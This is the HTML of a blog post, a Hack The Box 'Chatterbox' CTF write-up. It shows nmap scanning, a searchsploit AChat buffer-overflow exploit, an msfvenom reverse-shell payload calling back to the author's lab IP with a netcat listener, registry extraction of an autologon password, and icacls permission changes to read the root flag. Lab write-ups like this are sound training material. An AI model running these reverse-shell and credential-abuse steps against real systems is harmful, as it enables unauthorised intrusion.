@@ -1,0 +1,111 @@
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=generator content="Hugo 0.62.1 with theme Tranquilpeak 0.4.7-BETA"><meta name=author content="Christoffer Claesson"><meta name=keywords content><meta name=description content="My writeup of the Hack the box Chatterbox."><meta property="og:description" content="My writeup of the Hack the box Chatterbox."><meta property="og:type" content="article"><meta property="og:title" content="Chatterbox Writeup"><meta name=twitter:title content="Chatterbox Writeup"><meta property="og:url" content="https://securitybits-io.github.io/2018/06/chatterbox-writeup/"><meta property="twitter:url" content="https://securitybits-io.github.io/2018/06/chatterbox-writeup/"><meta property="og:site_name" content="Securitybits.io"><meta property="og:description" content="My writeup of the Hack the box Chatterbox."><meta name=twitter:description content="My writeup of the Hack the box Chatterbox."><meta property="og:locale" content="en-us"><meta property="article:published_time" content="2018-06-18T00:00:00"><meta property="article:modified_time" content="2018-06-18T00:00:00"><meta property="article:section" content="Hackthebox"><meta property="article:section" content="CTF"><meta property="article:section" content="Writeup"><meta property="article:tag" content="hackthebox"><meta property="article:tag" content="htb"><meta property="article:tag" content="pentest"><meta property="article:tag" content="ctf"><meta name=twitter:card content="summary"><meta name=twitter:site content="@Securitybits_io"><meta name=twitter:creator content="@Securitybits_io"><meta property="og:image" content="https://securitybits-io.github.io/img/posts/2018/06/chatterbox-writeup/chatterbox-writeup-banner.png"><meta property="twitter:image" content="https://securitybits-io.github.io/img/posts/2018/06/chatterbox-writeup/chatterbox-writeup-banner.png"><meta property="og:image" content="https://securitybits-io.github.io/img/posts/2018/06/chatterbox-writeup/chatterbox-writeup-banner.png"><meta property="twitter:image" content="https://securitybits-io.github.io/img/posts/2018/06/chatterbox-writeup/chatterbox-writeup-banner.png"><meta property="og:image" content="https://securitybits-io.github.io/img/profile.jpg"><meta property="twitter:image" content="https://securitybits-io.github.io/img/profile.jpg"><title>Chatterbox Writeup</title><link rel=icon href=https://securitybits-io.github.io/favicon.png><link rel=canonical href=https://securitybits-io.github.io/2018/06/chatterbox-writeup/><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin=anonymous><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin=anonymous><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin=anonymous><link rel=stylesheet href=https://securitybits-io.github.io/css/style-twzjdbqhmnnacqs0pwwdzcdbt8yhv8giawvjqjmyfoqnvazl0dalmnhdkvp7.min.css></head><body><div id=blog><header id=header data-behavior=5><i id=btn-open-sidebar class="fa fa-lg fa-bars"></i><div class=header-title><a class=header-title-link href=https://securitybits-io.github.io/>Securitybits.io</a></div><a class=header-right-picture href=https://securitybits-io.github.io/#about><img class=header-picture src=https://securitybits-io.github.io/img/profile.jpg alt="Author's picture"></a></header><nav id=sidebar data-behavior=5><div class=sidebar-container><div class=sidebar-profile><a href=https://securitybits-io.github.io/#about><img class=sidebar-profile-picture src=https://securitybits-io.github.io/img/profile.jpg alt="Author's picture"></a><h4 class=sidebar-profile-name>Christoffer Claesson</h4><h5 class=sidebar-profile-bio>Security ramblings from a viking!</h5></div><ul class=sidebar-buttons><li class=sidebar-button><a class=sidebar-button-link href=https://securitybits-io.github.io/><i class="sidebar-button-icon fa fa-lg fa-home"></i><span class=sidebar-button-desc>Home</span></a></li><li class=sidebar-button><a class=sidebar-button-link href=https://securitybits-io.github.io/categories><i class="sidebar-button-icon fa fa-lg fa-bookmark"></i><span class=sidebar-button-desc>Categories</span></a></li><li class=sidebar-button><a class=sidebar-button-link href=https://securitybits-io.github.io/tags><i class="sidebar-button-icon fa fa-lg fa-tags"></i><span class=sidebar-button-desc>Tags</span></a></li><li class=sidebar-button><a class=sidebar-button-link href=https://securitybits-io.github.io/archives><i class="sidebar-button-icon fa fa-lg fa-archive"></i><span class=sidebar-button-desc>Archives</span></a></li><li class=sidebar-button><a class=sidebar-button-link href=https://securitybits-io.github.io/page/about-me><i class="sidebar-button-icon fa fa-lg fa-question"></i><span class=sidebar-button-desc>About Me</span></a></li></ul><ul class=sidebar-buttons><li class=sidebar-button><a class=sidebar-button-link href=https://github.com/Securitybits-io target=_blank rel=noopener><i class="sidebar-button-icon fa fa-lg fa-github"></i><span class=sidebar-button-desc>GitHub</span></a></li><li class=sidebar-button><a class=sidebar-button-link href=https://twitter.com/Securitybits_io target=_blank rel=noopener><i class="sidebar-button-icon fa fa-lg fa-twitter"></i><span class=sidebar-button-desc>Twitter</span></a></li><li class=sidebar-button><a class=sidebar-button-link href=https://keybase.io/securitybits target=_blank rel=noopener><i class="sidebar-button-icon fa fa-lg fa-code-fork"></i><span class=sidebar-button-desc>Keybase.io</span></a></li></ul><ul class=sidebar-buttons><li class=sidebar-button><a class=sidebar-button-link href=https://securitybits-io.github.io/index.xml><i class="sidebar-button-icon fa fa-lg fa-rss"></i><span class=sidebar-button-desc>RSS</span></a></li></ul></div></nav><div class="post-header-cover
+text-center
+post-header-cover--partial" style=background-image:url(/img/posts/2018/06/chatterbox-writeup/chatterbox-writeup-banner.png) data-behavior=5></div><div id=main data-behavior=5 class="hasCover
+hasCoverMetaOut"><article class=post itemscope itemtype=http://schema.org/BlogPosting><div class="post-header main-content-wrap text-center"><h1 class=post-title itemprop=headline>Chatterbox Writeup</h1><div class="postShorten-meta post-meta"><time itemprop=datePublished datetime=2018-06-18T00:00:00Z>June 18, 2018</time>
+<span>in</span>
+<a class=category-link href=https://securitybits-io.github.io/categories/hackthebox>Hackthebox</a>,
+<a class=category-link href=https://securitybits-io.github.io/categories/ctf>CTF</a>,
+<a class=category-link href=https://securitybits-io.github.io/categories/writeup>Writeup</a></div></div><div class="post-content markdown" itemprop=articleBody><div class=main-content-wrap><blockquote><p>Never tell everything you know&mldr;
+-Roger H. Lincoln</p></blockquote><p>A box that warranted a lot of resets and frustrations. Due to the fact that the initial shell was provided with a Buffer Overflow, and crashing the service at the same time.</p><p>Connecting with my supplied VPN from HackTheBox<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>, and performing the initial NMAP scan on the box IP: 10.10.10.74</p><pre><code>root@kali:~/Chatterbox$ nmap -p- -T4 -Pn 10.10.10.74
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-18 16:57 CEST
+Nmap scan report for AChat (10.10.10.74)
+Host is up (0.041s latency).
+Not shown: 65533 filtered ports
+PORT     STATE SERVICE
+9255/tcp open  mon
+9256/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 287.36 seconds
+</code></pre><p>So that gives us two ports, lets run a more thorough scan on both.</p><pre><code>root@kali:~/Chatterbox$ nmap -p9255,9256 -sV --version-all 10.10.10.74
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-18 17:05 CEST
+Nmap scan report for AChat (10.10.10.74)
+Host is up (0.042s latency).
+
+PORT     STATE SERVICE VERSION
+9255/tcp open  http    AChat chat system httpd
+9256/tcp open  achat   AChat chat system
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.09 seconds
+</code></pre><p>Verification of these services can be done with a simple banner grab using netcat</p><pre><code>root@kali:~/Chatterbox$ nc 10.10.10.74 9255
+&gt; GET / HTTP/1.1
+
+HTTP/1.1 204 No Content
+Connection: close
+Server: AChat
+</code></pre><p>Now it serves a HTTP 204 No Content, but the server seems interesting. Reporting as AChat<sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup> we can determine (Unless its a fake HTTP Server), that theres some kind of chat server running behind that port.
+Using Searchsploit we can quite quickly see if there is some ready made exploit available.</p><pre><code>root@kali:~/Chatterbox$ searchsploit achat
+-------------------------------------------- ----------------------------------
+ Exploit Title                              |  Path
+                                            | (/usr/share/exploitdb/)
+-------------------------------------------- ----------------------------------
+Achat 0.150 beta7 - Remote Buffer Overflow  | exploits/windows/remote/36025.py
+[..snip..]
+-------------------------------------------- ----------------------------------
+Shellcodes: No Result
+Papers: No Result
+</code></pre><p>So there is as I mentioned before a ready made Buffer OverFlow, that could be used.
+First of all copy it to the current directory and look into the sourcecode (remember to never run anything without reviewing the sourcecode).</p><pre><code>root@kali:~/Chatterbox$ searchsploit -m 36025.py
+  Exploit: Achat 0.150 beta7 - Remote Buffer Overflow
+      URL: https://www.exploit-db.com/exploits/36025/
+     Path: /usr/share/exploitdb/exploits/windows/remote/36025.py
+File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators
+
+Copied to: /root/Documents/Documentation/CTF/htb/chatterbox/blog/36025.py
+</code></pre><p>The exploit comes with some customization. Namely create your own shellcode to use in the exploit, and as the exploit suggests lets use msfvenom to create a reverse shell.</p><pre><code>root@kali:~/Chatterbox$ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.7 LPORT=4000 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python &gt; shellcode.py
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/unicode_mixed
+x86/unicode_mixed succeeded with size 774 (iteration=0)
+x86/unicode_mixed chosen with final size 774
+Payload size: 774 bytes
+Final size of python file: 3706 bytes
+</code></pre><p>Now LHOST and LPORT are my own, substitute for your IP recieved by HackTheBox. The important part is that the shellcode generated is below 1152 bytes, as that is specified as the largest payload for this exploit. Mine that was generated is 774 bytes, so well below the threshold.
+Using a texteditor lets remove the existing &lsquo;buf&rsquo; lines from the exploit and replace with our generated ones.
+Now using the exploit, we also need to have a listener before the service is exploited.</p><pre><code>Exploit:
+root@kali:~/Chatterbox$ python 36025.py
+----&gt;{P00F}!
+root@kali:~/Chatterbox$
+</code></pre><pre><code>Listener:
+root@kali:~/Chatterbox$ nc -lvvp 4000
+listening on [any] 4000 ...
+connect to [10.10.14.7] from AChat [10.10.10.74] 49157
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+chatterbox\alfred
+C:\Windows\system32&gt;
+</code></pre><p>Cool, has shell, as &lsquo;Chatterbox\Alfred&rsquo;.</p><pre><code>c:\Users\Alfred\Desktop&gt;dir /Q
+Directory of c:\Users\Alfred\Desktop
+[..snip..]
+12/10/2017  07:50 PM                32 CHATTERBOX\Alfred      user.txt
+[..snip..]
+c:\Users\Alfred\Desktop&gt;
+</code></pre><p>So that takes care of one flag. Lets go for root!
+Doing some registry enumeration, which can be automated with scripts like Sherlock.ps1<sup id=fnref:3><a href=#fn:3 class=footnote-ref role=doc-noteref>3</a></sup>.
+We are presented with:</p><pre><code>c:\Users\Alfred\Desktop&gt;reg query &quot;HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
+[..snip..]
+    DefaultUserName    REG_SZ    Alfred
+    AutoAdminLogon    REG_SZ    1
+    DefaultPassword    REG_SZ    Welcome1!
+[..snip..]
+c:\Users\Alfred\Desktop&gt;
+</code></pre><p>Got a user and the password, what would the odds be that Alfred uses the same password for the administrator account?
+One could use powershell to get a shell as Administrator. But since you also have read access into the Administrator user as Alfred, we can also see if we can change permissions on root.txt using icacls.</p><pre><code>c:\Users\Administrator&gt;icacls c:\Users\administrator\desktop\root.txt CHATTERBOX\Alfred:(RX)
+icacls c:\Users\administrator\desktop\root.txt CHATTERBOX\Alfred:(RX)
+Invalid parameter &quot;CHATTERBOX\Alfred:(RX)&quot;
+
+c:\Users\Administrator&gt;icacls c:\Users\Administrator\Desktop\root.txt /grant everyone:(f)
+icacls c:\Users\Administrator\Desktop\root.txt /grant everyone:(f)
+processed file: c:\Users\Administrator\Desktop\root.txt
+Successfully processed 1 files; Failed processing 0 files
+
+c:\Users\Administrator&gt;type Desktop\root.txt
+type Desktop\root.txt
+EatSleepPwnRepeat
+</code></pre><section class=footnotes role=doc-endnotes><hr><ol><li id=fn:1 role=doc-endnote><p><a href=www.hackthebox.eu>www.hackthebox.eu</a> <a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:2 role=doc-endnote><p><a href=https://sourceforge.net/projects/achat/>www.sourceforge.net/projects/achat/</a> <a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:3 role=doc-endnote><p><a href=https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1>www.github.com/rasta-mouse</a> <a href=#fnref:3 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></section></div></div><div id=post-footer class="post-footer main-content-wrap"><div class=post-actions-wrap><nav><ul class="post-actions post-action-nav"><li class=post-action><a class="post-action-btn btn btn--default tooltip--top" href=https://securitybits-io.github.io/2018/06/falafel-writeup/ data-tooltip="Falafel Writeup"><i class="fa fa-angle-left"></i><span class="hide-xs hide-sm text-small icon-ml">NEXT</span></a></li><li class=post-action><a class="post-action-btn btn btn--default tooltip--top" href=https://securitybits-io.github.io/2018/04/rsa-prime-decryption/ data-tooltip="RSA Prime Decryption"><span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+<i class="fa fa-angle-right"></i></a></li></ul></nav><ul class="post-actions post-action-share"><li class="post-action hide-lg hide-md hide-sm"><a class="post-action-btn btn btn--default btn-open-shareoptions" href=#btn-open-shareoptions><i class="fa fa-share-alt"></i></a></li><li class="post-action hide-xs"><a class="post-action-btn btn btn--default" target=new href="https://www.facebook.com/sharer/sharer.php?u=https://securitybits-io.github.io/2018/06/chatterbox-writeup/"><i class="fa fa-facebook-official"></i></a></li><li class="post-action hide-xs"><a class="post-action-btn btn btn--default" target=new href="https://twitter.com/intent/tweet?text=https://securitybits-io.github.io/2018/06/chatterbox-writeup/"><i class="fa fa-twitter"></i></a></li><li class="post-action hide-xs"><a class="post-action-btn btn btn--default" target=new href="https://plus.google.com/share?url=https://securitybits-io.github.io/2018/06/chatterbox-writeup/"><i class="fa fa-google-plus"></i></a></li><li class=post-action><a class="post-action-btn btn btn--default" href=#><i class="fa fa-list"></i></a></li></ul></div></div></article><footer id=footer class=main-content-wrap><span class=copyrights>&copy; 2020 Christoffer Claesson. All Rights Reserved</span></footer></div><div id=bottom-bar class=post-bottom-bar data-behavior=5><div class=post-actions-wrap><nav><ul class="post-actions post-action-nav"><li class=post-action><a class="post-action-btn btn btn--default tooltip--top" href=https://securitybits-io.github.io/2018/06/falafel-writeup/ data-tooltip="Falafel Writeup"><i class="fa fa-angle-left"></i><span class="hide-xs hide-sm text-small icon-ml">NEXT</span></a></li><li class=post-action><a class="post-action-btn btn btn--default tooltip--top" href=https://securitybits-io.github.io/2018/04/rsa-prime-decryption/ data-tooltip="RSA Prime Decryption"><span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+<i class="fa fa-angle-right"></i></a></li></ul></nav><ul class="post-actions post-action-share"><li class="post-action hide-lg hide-md hide-sm"><a class="post-action-btn btn btn--default btn-open-shareoptions" href=#btn-open-shareoptions><i class="fa fa-share-alt"></i></a></li><li class="post-action hide-xs"><a class="post-action-btn btn btn--default" target=new href="https://www.facebook.com/sharer/sharer.php?u=https://securitybits-io.github.io/2018/06/chatterbox-writeup/"><i class="fa fa-facebook-official"></i></a></li><li class="post-action hide-xs"><a class="post-action-btn btn btn--default" target=new href="https://twitter.com/intent/tweet?text=https://securitybits-io.github.io/2018/06/chatterbox-writeup/"><i class="fa fa-twitter"></i></a></li><li class="post-action hide-xs"><a class="post-action-btn btn btn--default" target=new href="https://plus.google.com/share?url=https://securitybits-io.github.io/2018/06/chatterbox-writeup/"><i class="fa fa-google-plus"></i></a></li><li class=post-action><a class="post-action-btn btn btn--default" href=#><i class="fa fa-list"></i></a></li></ul></div></div><div id=share-options-bar class=share-options-bar data-behavior=5><i id=btn-close-shareoptions class="fa fa-close"></i><ul class=share-options><li class=share-option><a class=share-option-btn target=new href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fsecuritybits-io.github.io%2F2018%2F06%2Fchatterbox-writeup%2F"><i class="fa fa-facebook-official"></i><span>Share on Facebook</span></a></li><li class=share-option><a class=share-option-btn target=new href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fsecuritybits-io.github.io%2F2018%2F06%2Fchatterbox-writeup%2F"><i class="fa fa-twitter"></i><span>Share on Twitter</span></a></li><li class=share-option><a class=share-option-btn target=new href="https://plus.google.com/share?url=https%3A%2F%2Fsecuritybits-io.github.io%2F2018%2F06%2Fchatterbox-writeup%2F"><i class="fa fa-google-plus"></i><span>Share on Google+</span></a></li></ul></div><div id=share-options-mask class=share-options-mask></div></div><div id=about><div id=about-card><div id=about-btn-close><i class="fa fa-remove"></i></div><img id=about-card-picture src=https://securitybits-io.github.io/img/profile.jpg alt="Author's picture"><h4 id=about-card-name>Christoffer Claesson</h4><div id=about-card-bio>Security ramblings from a viking!</div><div id=about-card-job><i class="fa fa-briefcase"></i><br>Senior Penetration Tester</div><div id=about-card-location><i class="fa fa-map-marker"></i><br>Sweden</div></div></div><div id=cover style=background-image:url(https://securitybits-io.github.io/img/side-banner.jpg)></div><script src=https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin=anonymous></script><script src=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw=" crossorigin=anonymous></script><script src=https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin=anonymous></script><script src=https://securitybits-io.github.io/js/script-pcw6v3xilnxydl1vddzazdverrnn9ctynvnxgwho987mfyqkuylcb1nlt.min.js></script><script lang=javascript>window.onload=updateMinWidth;window.onresize=updateMinWidth;document.getElementById("sidebar").addEventListener("transitionend",updateMinWidth);function updateMinWidth(){var sidebar=document.getElementById("sidebar");var main=document.getElementById("main");main.style.minWidth="";var w1=getComputedStyle(main).getPropertyValue("min-width");var w2=getComputedStyle(sidebar).getPropertyValue("width");var w3=getComputedStyle(sidebar).getPropertyValue("left");main.style.minWidth=`calc(${w1} - ${w2} - ${w3})`;}</script><script>$(document).ready(function(){hljs.configure({classPrefix:'',useBR:false});$('pre.code-highlight > code, pre > code').each(function(i,block){if(!$(this).hasClass('codeblock')){$(this).addClass('codeblock');}
+hljs.highlightBlock(block);});});</script></body></html>
